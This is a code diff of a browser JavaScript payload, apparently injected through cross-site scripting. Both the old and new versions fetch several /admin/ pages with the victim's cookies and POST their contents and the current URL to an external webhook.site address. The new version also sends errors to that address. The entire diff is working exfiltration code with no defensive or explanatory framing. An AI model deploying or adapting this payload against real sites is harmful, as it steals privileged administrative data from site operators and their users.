@@ -1,14 +1,32 @@
-const W = "https://webhook.site/bbb85c7c-3286-4258-9ca0-8473ede3084e";
-const send = (tag, data) => fetch(`${W}/${tag}`, {
-  method: "POST",
-  mode: "no-cors",
-  body: data,
-});
+(async () => {
+  const receiver = "https://webhook.site/bbb85c7c-3286-4258-9ca0-8473ede3084e";
 
-send("alive", location.href);
+  for (const path of ["/admin/", "/admin/review.php", "/admin/search.php"]) {
+    try {
+      const response = await fetch(path, {
+        credentials: "include"
+      });
 
-["/admin/", "/admin/review.php", "/admin/search.php"].forEach((url) => {
-  fetch(url, { credentials: "include" })
-    .then((response) => response.text())
-    .then((body) => send(`page-${btoa(url)}`, body));
-});
+      const body = await response.text();
+
+      await fetch(receiver, {
+        method: "POST",
+        mode: "no-cors",
+        body: JSON.stringify({
+          path: path,
+          url: location.href,
+          body: body
+        })
+      });
+    } catch (error) {
+      await fetch(receiver, {
+        method: "POST",
+        mode: "no-cors",
+        body: JSON.stringify({
+          error: String(error),
+          path: path
+        })
+      });
+    }
+  }
+})();
